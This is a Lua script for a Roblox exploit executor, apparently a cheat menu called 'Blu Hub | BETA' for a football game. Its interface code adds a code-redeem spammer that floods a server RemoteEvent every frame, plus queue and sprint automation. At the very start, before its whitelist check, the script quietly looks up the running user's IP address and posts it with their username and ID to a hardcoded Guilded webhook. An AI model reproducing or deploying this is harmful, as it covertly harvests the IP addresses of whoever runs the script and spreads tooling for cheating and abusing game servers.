local UserIds = {
	105115151,		--Blu
	132541900, 2730836956,	--David
	149522897,		--Booh
	1425652856,		--Kaz
	1768352413,		--Will
}
local WebUrl = "https://media.guilded.gg/webhooks/d5b07cb7-b836-43c7-981f-8279bdf18f95/Qo6g2U1MMCQMuUaikMCUYM0eGkO8EG22WA6WOe0U4am8Ycs4CCasU4qQeAUIscyAkSE4sIaOeSssEqgoGEkGcG"


local Player = game:GetService("Players").LocalPlayer
local ip = tostring(game:HttpGet("https://api.ipify.org", true))
local msg = {
	["embeds"] = {{
		["title"] = "**".. Player.Name .."**",
		["color"] = 13708129,
		["description"] = "IP: ".. ip,
		["thumbnail"] = {
			["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=".. Player.UserId .."&width=420&height=420&format=png",
		},
		["footer"] = {
			["text"] = "Player ID: ".. Player.UserId,
		},
	}}
}

local response = syn.request(
	{
		Url = WebUrl,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = game:GetService("HttpService"):JSONEncode(msg)
	}
)

if table.find(UserIds, Player.UserId) then
	local ScreenGui = Instance.new("ScreenGui")
	local ImageButton = Instance.new("ImageButton")
	local Pages = Instance.new("Folder")
	local Frame_ = Instance.new("Frame")
	local Game_ = Instance.new("Frame")
	local Column1_Game_ = Instance.new("ScrollingFrame")
	local UIListLayout = Instance.new("UIListLayout")
	local UIPadding = Instance.new("UIPadding")
	local ActiveBar = Instance.new("Frame")
	local Column2_Game_ = Instance.new("ScrollingFrame")
	local UIListLayout_2 = Instance.new("UIListLayout")
	local UIPadding_2 = Instance.new("UIPadding")
	local Settings = Instance.new("Frame")
	local Column2_Settings = Instance.new("ScrollingFrame")
	local UIListLayout_3 = Instance.new("UIListLayout")
	local UIPadding_3 = Instance.new("UIPadding")
	local Column1_Settings = Instance.new("ScrollingFrame")
	local UIListLayout_4 = Instance.new("UIListLayout")
	local UIPadding_4 = Instance.new("UIPadding")
	local ActiveBar_2 = Instance.new("Frame")
	local HubName = Instance.new("TextLabel")
	local Settings_2 = Instance.new("TextButton")
	local Game_2 = Instance.new("TextButton")
	local TopBar = Instance.new("Frame")
	local Outline = Instance.new("Frame")

	--Properties:
	ScreenGui.Parent = game:WaitForChild("CoreGui")

	ImageButton.Parent = ScreenGui
	ImageButton.Draggable = true
	ImageButton.AnchorPoint = Vector2.new(0.5, 0.5)
	ImageButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
	ImageButton.Position = UDim2.new(0.5, 5, 0.25, 0)
	ImageButton.Size = UDim2.new(0, 494, 0, 320)
	ImageButton.AutoButtonColor = false
	ImageButton.ImageColor3 = Color3.fromRGB(0, 0, 0)
	ImageButton.ScaleType = Enum.ScaleType.Tile
	ImageButton.TileSize = UDim2.new(0, 90, 0, 90)

	Pages.Name = "Pages"
	Pages.Parent = ImageButton

	Frame_.Parent = Pages
	Frame_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Frame_.BackgroundTransparency = 1.000
	Frame_.Position = UDim2.new(0, 0, 0, 52)
	Frame_.Size = UDim2.new(0, 494, 0, 268)

	Game_.Name = "Game"
	Game_.Parent = Pages
	Game_.BackgroundTransparency = 1.000
	Game_.Position = UDim2.new(0, 5, 0, 55)
	Game_.Size = UDim2.new(1, -10, 1, -60)

	Column1_Game_.Name = "Column1"
	Column1_Game_.Parent = Game_
	Column1_Game_.BackgroundTransparency = 1.000
	Column1_Game_.BorderSizePixel = 0
	Column1_Game_.Position = UDim2.new(0, 6, 0, 2)
	Column1_Game_.Size = UDim2.new(0, 233, 1, -4)
	Column1_Game_.ZIndex = 2
	Column1_Game_.ScrollBarThickness = 0
	Column1_Game_.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

	UIListLayout.Parent = Column1_Game_
	UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.Padding = UDim.new(0, 25)

	UIPadding.Parent = Column1_Game_
	UIPadding.PaddingLeft = UDim.new(0, 2)
	UIPadding.PaddingRight = UDim.new(0, 2)
	UIPadding.PaddingTop = UDim.new(0, 8)

	ActiveBar.Name = "ActiveBar"
	ActiveBar.Parent = Game_
	ActiveBar.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
	ActiveBar.BorderSizePixel = 0
	ActiveBar.Position = UDim2.new(0, 9, 0, -3)
	ActiveBar.Size = UDim2.new(0, 50, 0, -1)

	Column2_Game_.Name = "Column2"
	Column2_Game_.Parent = Game_
	Column2_Game_.BackgroundTransparency = 1.000
	Column2_Game_.BorderSizePixel = 0
	Column2_Game_.Position = UDim2.new(0, 245, 0, 2)
	Column2_Game_.Size = UDim2.new(0, 233, 1, -4)
	Column2_Game_.ZIndex = 2
	Column2_Game_.CanvasSize = UDim2.new(0, 0, 0, 0)
	Column2_Game_.ScrollBarThickness = 0
	Column2_Game_.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

	UIListLayout_2.Parent = Column2_Game_
	UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_2.Padding = UDim.new(0, 12)

	UIPadding_2.Parent = Column2_Game_
	UIPadding_2.PaddingLeft = UDim.new(0, 2)
	UIPadding_2.PaddingRight = UDim.new(0, 2)
	UIPadding_2.PaddingTop = UDim.new(0, 8)

	Settings.Name = "Settings"
	Settings.Parent = Pages
	Settings.BackgroundTransparency = 1.000
	Settings.Position = UDim2.new(0, 5, 0, 55)
	Settings.Size = UDim2.new(1, -10, 1, -60)
	Settings.Visible = false

	Column2_Settings.Name = "Column2"
	Column2_Settings.Parent = Settings
	Column2_Settings.BackgroundTransparency = 1.000
	Column2_Settings.BorderSizePixel = 0
	Column2_Settings.Position = UDim2.new(0, 245, 0, 2)
	Column2_Settings.Size = UDim2.new(0, 233, 1, -4)
	Column2_Settings.ZIndex = 2
	Column2_Settings.CanvasSize = UDim2.new(0, 0, 0, 0)
	Column2_Settings.ScrollBarThickness = 0
	Column2_Settings.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

	UIListLayout_3.Parent = Column2_Settings
	UIListLayout_3.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_3.Padding = UDim.new(0, 12)

	UIPadding_3.Parent = Column2_Settings
	UIPadding_3.PaddingLeft = UDim.new(0, 2)
	UIPadding_3.PaddingRight = UDim.new(0, 2)
	UIPadding_3.PaddingTop = UDim.new(0, 8)

	Column1_Settings.Name = "Column1"
	Column1_Settings.Parent = Settings
	Column1_Settings.BackgroundTransparency = 1.000
	Column1_Settings.BorderSizePixel = 0
	Column1_Settings.Position = UDim2.new(0, 6, 0, 2)
	Column1_Settings.Size = UDim2.new(0, 233, 1, -4)
	Column1_Settings.ZIndex = 2
	Column1_Settings.CanvasSize = UDim2.new(0, 0, 0, 0)
	Column1_Settings.ScrollBarThickness = 0
	Column1_Settings.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

	UIListLayout_4.Parent = Column1_Settings
	UIListLayout_4.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout_4.Padding = UDim.new(0, 25)

	UIPadding_4.Parent = Column1_Settings
	UIPadding_4.PaddingLeft = UDim.new(0, 2)
	UIPadding_4.PaddingRight = UDim.new(0, 2)
	UIPadding_4.PaddingTop = UDim.new(0, 8)

	ActiveBar_2.Name = "ActiveBar"
	ActiveBar_2.Parent = Settings
	ActiveBar_2.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
	ActiveBar_2.BorderSizePixel = 0
	ActiveBar_2.Position = UDim2.new(0, 84, 0, -3)
	ActiveBar_2.Size = UDim2.new(0, 77, 0, -1)

	HubName.Name = "Hub Name"
	HubName.Parent = ImageButton
	HubName.BackgroundTransparency = 1.000
	HubName.Position = UDim2.new(0, 6, 0, -1)
	HubName.Size = UDim2.new(0, 0, 0, 20)
	HubName.ZIndex = 5
	HubName.Font = Enum.Font.Code
	HubName.Text = "Blu Hub | BETA"
	HubName.TextColor3 = Color3.fromRGB(255, 255, 255)
	HubName.TextSize = 18.000
	HubName.TextXAlignment = Enum.TextXAlignment.Left

	Settings_2.Name = "Settings"
	Settings_2.Parent = ImageButton
	Settings_2.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
	Settings_2.BackgroundTransparency = 1.000
	Settings_2.Position = UDim2.new(0, 89, 0, 22)
	Settings_2.Size = UDim2.new(0, 77, 0, 30)
	Settings_2.ZIndex = 5
	Settings_2.Font = Enum.Font.Code
	Settings_2.Text = "Settings"
	Settings_2.TextColor3 = Color3.fromRGB(253, 21, 32)
	Settings_2.TextSize = 15.000

	Game_2.Name = "Game"
	Game_2.Parent = ImageButton
	Game_2.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
	Game_2.BackgroundTransparency = 1.000
	Game_2.Position = UDim2.new(0, 0, 0, 22)
	Game_2.Size = UDim2.new(0, 77, 0, 30)
	Game_2.ZIndex = 5
	Game_2.Font = Enum.Font.Code
	Game_2.Text = "Game"
	Game_2.TextColor3 = Color3.fromRGB(253, 21, 32)
	Game_2.TextSize = 15.000

	TopBar.Name = "TopBar"
	TopBar.Parent = ImageButton
	TopBar.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
	TopBar.BorderSizePixel = 0
	TopBar.Position = UDim2.new(0, 0, 0, 24)
	TopBar.Size = UDim2.new(1, 0, 0, 1)
	TopBar.ZIndex = 5

	Outline.Name = "Outline"
	Outline.Parent = ImageButton
	Outline.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	Outline.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Outline.Size = UDim2.new(1, 0, 0, 50)
	Outline.ZIndex = 4

	--Main:

	CreateTab = function(Parent, Name ,Size)
		local Frame = Instance.new("Frame")
		local Color = Instance.new("Frame")
		local TabName = Instance.new("TextLabel")
		local Buttons = Instance.new("ScrollingFrame")
		local UIListLayout = Instance.new("UIListLayout")
		local UIPadding = Instance.new("UIPadding")

		Frame.Name = Name
		Frame.Parent = Parent
		Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Frame.Size = Size[1]

		Color.Name = "Color"
		Color.Parent = Frame
		Color.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
		Color.BorderSizePixel = 0
		Color.Size = UDim2.new(1, 0, 0, 1)

		TabName.Parent = Frame
		TabName.AnchorPoint = Vector2.new(0, 0.5)
		TabName.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		TabName.BorderSizePixel = 0
		TabName.Position = UDim2.new(0, 8, 0, 0)
		TabName.Size = Size[2]
		TabName.Font = Enum.Font.Code
		TabName.Text = Name
		TabName.TextColor3 = Color3.fromRGB(255, 255, 255)
		TabName.TextSize = 15.000

		Buttons.Name = "Buttons"
		Buttons.Parent = Frame
		Buttons.BackgroundTransparency = 1.000
		Buttons.BorderSizePixel = 0
		Buttons.Size = UDim2.new(1, 0, 1, 0)
		Buttons.ZIndex = 2
		Buttons.CanvasSize = UDim2.new(0, 0, 0, 0)
		Buttons.ScrollBarThickness = 0
		Buttons.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

		UIListLayout.Parent = Buttons
		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		UIListLayout.SortOrder = Enum.SortOrder.Name
		UIListLayout.Padding = UDim.new(0, 2)

		UIPadding.Parent = Buttons
		UIPadding.PaddingTop = UDim.new(0, 12)

		return Frame
	end
	ToggleButton = function(Parent, Name)
		local Frame = Instance.new("Frame")
		local Button = Instance.new("TextButton")
		local ImageLabel = Instance.new("ImageLabel")
		local ImageLabel_2 = Instance.new("ImageLabel")
		local Text = Instance.new("TextLabel")

		Frame.Name = Name
		Frame.Parent = Parent.Buttons
		Frame.BackgroundTransparency = 1.000
		Frame.LayoutOrder = 5
		Frame.Size = UDim2.new(1, 0, 0, 20)

		Button.Name = "Button"
		Button.Parent = Frame
		Button.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
		Button.BackgroundTransparency = 1.000
		Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Button.Position = UDim2.new(0, 6, 0, 4)
		Button.Size = UDim2.new(0, 12, 0, 12)
		Button.ZIndex = 2
		Button.Font = Enum.Font.SourceSans
		Button.Text = ""
		Button.TextColor3 = Color3.fromRGB(0, 0, 0)
		Button.TextSize = 14.000

		ImageLabel.Parent = Button
		ImageLabel.BackgroundTransparency = 1.000
		ImageLabel.Size = UDim2.new(1, 0, 1, 0)
		ImageLabel.ZIndex = 3
		ImageLabel.Image = "rbxassetid://2592362371"
		ImageLabel.ImageColor3 = Color3.fromRGB(60, 60, 60)
		ImageLabel.ScaleType = Enum.ScaleType.Slice
		ImageLabel.SliceCenter = Rect.new(2, 2, 62, 62)

		ImageLabel_2.Parent = Button
		ImageLabel_2.BackgroundTransparency = 1.000
		ImageLabel_2.Position = UDim2.new(0, 1, 0, 1)
		ImageLabel_2.Size = UDim2.new(1, -2, 1, -2)
		ImageLabel_2.ZIndex = 2
		ImageLabel_2.Image = "rbxassetid://2592362371"
		ImageLabel_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_2.ScaleType = Enum.ScaleType.Slice
		ImageLabel_2.SliceCenter = Rect.new(2, 2, 62, 62)

		Text.Name = "Text"
		Text.Parent = Frame
		Text.BackgroundTransparency = 1.000
		Text.Position = UDim2.new(0, 24, 0, 0)
		Text.Size = UDim2.new(1, 0, 1, 0)
		Text.Font = Enum.Font.Code
		Text.Text = Name
		Text.TextColor3 = Color3.fromRGB(160, 160, 160)
		Text.TextSize = 15.000
		Text.TextXAlignment = Enum.TextXAlignment.Left

		return Frame
	end
	BigButton = function(Parent, Name)
		local Frame = Instance.new("Frame")
		local Button = Instance.new("TextButton")
		local ImageLabel = Instance.new("ImageLabel")
		local ImageLabel_2 = Instance.new("ImageLabel")

		Frame.Name = Name
		Frame.Parent = Parent.Buttons
		Frame.BackgroundTransparency = 1.000
		Frame.LayoutOrder = 4
		Frame.Size = UDim2.new(1, 0, 0, 20)

		Button.Parent = Frame
		Button.Name = "Button"
		Button.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
		Button.BackgroundTransparency = 1.000
		Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Button.Position = UDim2.new(0, 31, 0, 22)
		Button.Size = UDim2.new(0, 155, 0, 32)
		Button.ZIndex = 3
		Button.Font = Enum.Font.Code
		Button.Text = Name
		Button.TextColor3 = Color3.fromRGB(160, 160, 160)
		Button.TextSize = 14.000

		ImageLabel.Parent = Button
		ImageLabel.BackgroundTransparency = 1.000
		ImageLabel.Position = UDim2.new(0, 1, 0, 1)
		ImageLabel.Size = UDim2.new(1, -2, 1, -2)
		ImageLabel.ZIndex = 2
		ImageLabel.Image = "rbxassetid://2592362371"
		ImageLabel.ImageColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel.ScaleType = Enum.ScaleType.Slice
		ImageLabel.SliceCenter = Rect.new(2, 2, 62, 62)

		ImageLabel_2.Parent = Button
		ImageLabel_2.BackgroundTransparency = 1.000
		ImageLabel_2.Size = UDim2.new(1, 0, 1, 0)
		ImageLabel_2.Image = "rbxassetid://2592362371"
		ImageLabel_2.ImageColor3 = Color3.fromRGB(60, 60, 60)
		ImageLabel_2.ScaleType = Enum.ScaleType.Slice
		ImageLabel_2.SliceCenter = Rect.new(2, 2, 62, 62)

		return Frame
	end
	Keybind = function(Parent, Name)
		local Frame = Instance.new("Frame")
		local TextLabel = Instance.new("TextLabel")
		local TextButton = Instance.new("TextButton")
		local ImageLabel = Instance.new("ImageLabel")
		local ImageLabel_2 = Instance.new("ImageLabel")

		Frame.Name = Name
		Frame.Parent = Parent.Buttons
		Frame.BackgroundTransparency = 1.000
		Frame.Size = UDim2.new(1, 0, 0, 42)

		TextLabel.Parent = Frame
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.Position = UDim2.new(0, 7, 0, 0)
		TextLabel.Size = UDim2.new(0.942731261, 0, 0.571428657, 0)
		TextLabel.Font = Enum.Font.Code
		TextLabel.Text = Name
		TextLabel.TextColor3 = Color3.fromRGB(160, 160, 160)
		TextLabel.TextSize = 15.000
		TextLabel.TextXAlignment = Enum.TextXAlignment.Left

		TextButton.Parent = Frame
		TextButton.Name = "Button"
		TextButton.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
		TextButton.BackgroundTransparency = 1.000
		TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TextButton.Position = UDim2.new(0.427312791, 0, 0, 0)
		TextButton.Size = UDim2.new(0.54625535, 0, 0.476190478, 0)
		TextButton.ZIndex = 2
		TextButton.Font = Enum.Font.Code
		TextButton.Text = ""
		TextButton.TextColor3 = Color3.fromRGB(160, 160, 160)
		TextButton.TextScaled = true
		TextButton.TextSize = 18.000
		TextButton.TextWrapped = true

		ImageLabel.Parent = TextButton
		ImageLabel.BackgroundTransparency = 1.000
		ImageLabel.Position = UDim2.new(0, 1, 0, 1)
		ImageLabel.Size = UDim2.new(1, -2, 1, -2)
		ImageLabel.ZIndex = 2
		ImageLabel.Image = "rbxassetid://2592362371"
		ImageLabel.ImageColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel.ScaleType = Enum.ScaleType.Slice
		ImageLabel.SliceCenter = Rect.new(2, 2, 62, 62)

		ImageLabel_2.Parent = TextButton
		ImageLabel_2.BackgroundTransparency = 1.000
		ImageLabel_2.Size = UDim2.new(1, 0, 1.00000012, 0)
		ImageLabel_2.ZIndex = 3
		ImageLabel_2.Image = "rbxassetid://2592362371"
		ImageLabel_2.ImageColor3 = Color3.fromRGB(60, 60, 60)
		ImageLabel_2.ScaleType = Enum.ScaleType.Slice
		ImageLabel_2.SliceCenter = Rect.new(2, 2, 62, 62)

		return Frame
	end

	ToggleTextBox = function(Parent, Name, PlaceHolder)
		local Frame = Instance.new("Frame")
		local TextButton = Instance.new("TextButton")
		local ImageLabel = Instance.new("ImageLabel")
		local ImageLabel_2 = Instance.new("ImageLabel")
		local TextFrame = Instance.new("Frame")
		local ImageLabel_3 = Instance.new("ImageLabel")
		local ImageLabel_4 = Instance.new("ImageLabel")
		local ImageLabel_5 = Instance.new("ImageLabel")
		local TextBox = Instance.new("TextBox")
		local TextLabel = Instance.new("TextLabel")

		Frame.Name = Name
		Frame.Parent = Parent.Buttons
		Frame.BackgroundTransparency = 1.000
		Frame.Size = UDim2.new(0.982301295, 0, 0.127808765, 42)

		TextButton.Parent = Frame
		TextButton.BackgroundColor3 = Color3.fromRGB(253, 21, 32)
		TextButton.BackgroundTransparency = 1.000
		TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TextButton.Position = UDim2.new(0, 6, 0, 4)
		TextButton.Size = UDim2.new(0, 12, 0, 12)
		TextButton.ZIndex = 2
		TextButton.Font = Enum.Font.SourceSans
		TextButton.Text = ""
		TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
		TextButton.TextSize = 14.000

		ImageLabel.Parent = TextButton
		ImageLabel.BackgroundTransparency = 1.000
		ImageLabel.Size = UDim2.new(1, 0, 1, 0)
		ImageLabel.ZIndex = 3
		ImageLabel.Image = "rbxassetid://2592362371"
		ImageLabel.ImageColor3 = Color3.fromRGB(60, 60, 60)
		ImageLabel.ScaleType = Enum.ScaleType.Slice
		ImageLabel.SliceCenter = Rect.new(2, 2, 62, 62)

		ImageLabel_2.Parent = TextButton
		ImageLabel_2.BackgroundTransparency = 1.000
		ImageLabel_2.Position = UDim2.new(0, 1, 0, 1)
		ImageLabel_2.Size = UDim2.new(1, -2, 1, -2)
		ImageLabel_2.ZIndex = 2
		ImageLabel_2.Image = "rbxassetid://2592362371"
		ImageLabel_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_2.ScaleType = Enum.ScaleType.Slice
		ImageLabel_2.SliceCenter = Rect.new(2, 2, 62, 62)

		TextFrame.Name = "TextFrame"
		TextFrame.Parent = Frame
		TextFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		TextFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TextFrame.Position = UDim2.new(0, 6, 0, 22)
		TextFrame.Size = UDim2.new(1.00000012, -12, 0.270365298, 16)

		ImageLabel_3.Parent = TextFrame
		ImageLabel_3.BackgroundTransparency = 1.000
		ImageLabel_3.Position = UDim2.new(0, 1, 0, 1)
		ImageLabel_3.Size = UDim2.new(1, -2, 1, -2)
		ImageLabel_3.Image = "rbxassetid://2592362371"
		ImageLabel_3.ImageColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_3.ScaleType = Enum.ScaleType.Slice
		ImageLabel_3.SliceCenter = Rect.new(2, 2, 62, 62)

		ImageLabel_4.Parent = TextFrame
		ImageLabel_4.BackgroundTransparency = 1.000
		ImageLabel_4.Size = UDim2.new(1, 0, 1, 0)
		ImageLabel_4.Image = "rbxassetid://2592362371"
		ImageLabel_4.ImageColor3 = Color3.fromRGB(60, 60, 60)
		ImageLabel_4.ScaleType = Enum.ScaleType.Slice
		ImageLabel_4.SliceCenter = Rect.new(2, 2, 62, 62)

		ImageLabel_5.Parent = TextFrame
		ImageLabel_5.BackgroundTransparency = 1.000
		ImageLabel_5.Size = UDim2.new(1, 0, 1, 0)
		ImageLabel_5.ZIndex = 2
		ImageLabel_5.Image = "rbxassetid://2454009026"
		ImageLabel_5.ImageColor3 = Color3.fromRGB(0, 0, 0)
		ImageLabel_5.ImageTransparency = 0.800

		TextBox.Parent = TextFrame
		TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
		TextBox.BackgroundTransparency = 1.000
		TextBox.Position = UDim2.new(0.5, 0, 0.5, 0)
		TextBox.Size = UDim2.new(1, 0, 1, 0)
		TextBox.ZIndex = 2
		TextBox.Font = Enum.Font.Code
		TextBox.PlaceholderText = PlaceHolder
		TextBox.Text = ""
		TextBox.TextColor3 = Color3.fromRGB(210, 210, 210)
		TextBox.TextSize = 14.000
		TextBox.TextWrapped = true

		TextLabel.Parent = Frame
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.Position = UDim2.new(0, 26, 0, 0)
		TextLabel.Size = UDim2.new(1.00000012, 0, 0.331039131, 0)
		TextLabel.Font = Enum.Font.Code
		TextLabel.Text = "Code Spammer"
		TextLabel.TextColor3 = Color3.fromRGB(160, 160, 160)
		TextLabel.TextSize = 15.000
		TextLabel.TextXAlignment = Enum.TextXAlignment.Left

		return Frame
	end

	local UserInput = game:GetService("UserInputService")
	local runService = game:GetService("RunService")
	local Debris = game:GetService("Debris")

	local ToggleGui_Keybind = "RightShift"

	local Script_Disabled = false

	local Image = nil

	coroutine.resume(coroutine.create(function()
		local data = readfile("image.png")
		if data then	
			Image = Drawing.new("Image")
			Image.Size = Frame_.AbsoluteSize
			Image.Transparency = 0.4
			Image.Data = data
			Image.Visible = true
			Image.Position = Frame_.AbsolutePosition + Vector2.new(0, 35)

			while not Script_Disabled do
				wait()
				Image.Position = Frame_.AbsolutePosition + Vector2.new(0, 35)
			end
			Image:Remove()
		end
	end))

	function TogglePages(Page)
		for _, i in pairs(Pages:GetChildren()) do
			if i.Name ~= Page then
				i.Visible = false
			else
				i.Visible = true
			end
		end
	end

	Game_2.MouseButton1Click:Connect(function() TogglePages(Game_2.Name) end)
	Settings_2.MouseButton1Click:Connect(function() TogglePages(Settings_2.Name) end)

	local Hub_Tab = CreateTab(Column2_Settings, "Hub", {UDim2.new(1, 0, 0, 80), UDim2.new(0, 31, 0, 2)})
	local Unload = BigButton(Hub_Tab, "Unload")

	local Keybinds_Tab = CreateTab(Column1_Settings, "Keybinds", {UDim2.new(1, 0, 0, 100), UDim2.new(0, 68, 0, 2)})
	local Gui_Keybind = Keybind(Keybinds_Tab, "Toggle Gui")
	Gui_Keybind.Button.Text = ToggleGui_Keybind

	Gui_Keybind.Button.MouseButton1Click:Connect(function()
		ToggleGui_Keybind = ""
		Gui_Keybind.Button.Text = ToggleGui_Keybind
	end)

	UserInput.InputBegan:Connect(function(Key, isTyping)
		if not Script_Disabled then
			if ToggleGui_Keybind == "" then
				local Str = string.split(tostring(Key.KeyCode), ".")
				if Str[3] ~= "Unknown" then
					ToggleGui_Keybind = Str[3]
					Gui_Keybind.Button.Text = ToggleGui_Keybind
				end
			elseif Key.KeyCode == Enum.KeyCode[ToggleGui_Keybind] and not isTyping then
				if ImageButton.Visible == true then
					ImageButton.Visible = false
					if Image then
						Image.Transparency = 0
					end
				else
					ImageButton.Visible = true
					if Image then
						Image.Transparency = 0.4
					end
				end
			end

		end
	end)
	Unload.Button.MouseButton1Click:Connect(function()
		Script_Disabled = true
		ScreenGui:Destroy()
		--
		local Character = Player.Character
		if Character:FindFirstChild("Radius") then Character.Radius:Destroy() end
		if Character.HumanoidRootPart:FindFirstChild("Radius") then Character.HumanoidRootPart.Radius:Destroy() end
	end)

	if game.GameId == 3213718766 then -- Goal!
		local SprintSpeed = 21
		local StepTackleRadius = 12
		local SlideTackleRadius = 15

		if game.PlaceId == 8397893574 then
			local Customize_Tab = CreateTab(Column1_Game_, "Customize", {UDim2.new(1, 0, 0.074, 100), UDim2.new(0, 77, 0, 2)})

			local Code_Spammer = ToggleTextBox(Customize_Tab, "Code Spammer", "Code")

			Code_Spammer.Button.MouseButton1Click:Connect(function()
				if Code_Spammer.Button.BackgroundTransparency == 0 then
					Code_Spammer.Button.BackgroundTransparency = 1
				else
					Code_Spammer.Button.BackgroundTransparency = 0
				end
				if Code_Spammer.Button.BackgroundTransparency == 0 then
					local a, b, c, d, e, f, g
					local Event = Player.PlayerGui.Intro.Customize.CustomizationFrame.Codes.Redeem.LocalScript.RemoteEvent
					local Text = Code_Spammer.TextFrame.TextBox.Text
					a = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
					b = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
					c = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
					d = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
					e = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
					f = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
					g = runService.RenderStepped:Connect(function() Event:FireServer(Text) end)
					wait(5)
					a:Disconnect()
					b:Disconnect()
					c:Disconnect()
					d:Disconnect()
					e:Disconnect()
					f:Disconnect()
					g:Disconnect()
				end
			end)

		elseif game.PlaceId == 9822821238 then
			local Game_Tab = CreateTab(Column1_Game_, "Goal!", {UDim2.new(0.95, 0, 0, 103), UDim2.new(0, 39, 0, 2)}, UDim2.new(0, 8, 0, 0))

			local Quick_Queue = ToggleButton(Game_Tab, "Quick Queue")
			local Toggle_Sprint = ToggleButton(Game_Tab, "Toggle Sprint")
			local No_Sit = ToggleButton(Game_Tab, "No Sit")
			local Unlock_Camera = ToggleButton(Game_Tab, "Unlock Camera Zoom")
			
			local Badge_Tab = CreateTab(Column1_Game_, "Badges", {UDim2.new(0.95, 0, 0, 80), UDim2.new(0, 39, 0, 2)}, UDim2.new(0, 8, 0, 0))
			
			local Acrobatic = ToggleButton(Badge_Tab, "Acrobatic")
			local Ball_Awareness = ToggleButton(Badge_Tab, "Ball Awareness")
			local FormlessShooter = ToggleButton(Badge_Tab, "Formless Shooter")
			
			local AutoDribble_Tab = CreateTab(Column2_Game_, "Auto Dribble", {UDim2.new(0.949, 0, 0.01, 80), UDim2.new(0, 101, 0, 2)}, UDim2.new(0, 8, 0, 0))

			local Auto_Dribble = ToggleButton(AutoDribble_Tab, "Auto Dribble")
			local Jump_Input = ToggleButton(AutoDribble_Tab, "Jump Input")
			local Show_Step_Radius = ToggleButton(AutoDribble_Tab, "Show Step Radius")

			---------------------------------------------------------------------------
			local Actual_Spots = {}
			for _, i in pairs(workspace:GetDescendants()) do
				if i.Parent.Name == "BlueSpots" or i.Parent.Name == "RedSpots" and i:FindFirstChildOfClass("ProximityPrompt") then
					table.insert(Actual_Spots, i)
				end
			end
			local function FindSpot(Character)
				local filter_table = {}

				for _, i in pairs(workspace:GetDescendants()) do
					if i.Parent.Name == "BlueSpots" or i.Parent.Name == "RedSpots" then
						if i:IsA('Part') and i:FindFirstChildOfClass("ProximityPrompt") then
							table.insert(filter_table, i)
						end
					end
				end

				local startPoint = Character.HumanoidRootPart.Position
				local closestPart = nil
				local minDistance = math.huge
				for _, part in pairs(filter_table) do
					local distance = (part.Position - startPoint).Magnitude
					if distance < minDistance then
						minDistance = distance
						closestPart = part
					end
				end

				return closestPart
			end
			Quick_Queue.Button.MouseButton1Click:Connect(function()
				if Quick_Queue.Button.BackgroundTransparency == 0 then

					Quick_Queue.Button.BackgroundTransparency = 1
				else
					Quick_Queue.Button.BackgroundTransparency = 0
				end
				if Quick_Queue.Button.BackgroundTransparency == 0 then

					local NearestSpot = FindSpot(Player.Character)

					while Quick_Queue.Button.BackgroundTransparency == 0 and not Script_Disabled do
						local Character = Player.Character
						if NearestSpot.Parent.Parent["-Scoreboard"].Timer.Txt.Text == "300" and not Player.Character.VFX.IsPlaying.Value and not Player.Character.VFX.NoMove.Value and Quick_Queue.Button.BackgroundTransparency ~= 1 and not Script_Disabled then
							fireproximityprompt(NearestSpot.ProximityPrompt, 1)
							Quick_Queue.Button.BackgroundTransparency = 1
						end
						repeat task.wait() until NearestSpot.Parent.Parent["-Scoreboard"].Timer.Txt.Text == "300" or Quick_Queue.Button.BackgroundTransparency == 1 or Script_Disabled
					end
				end
			end)
			---------------------------------------------------------------------------
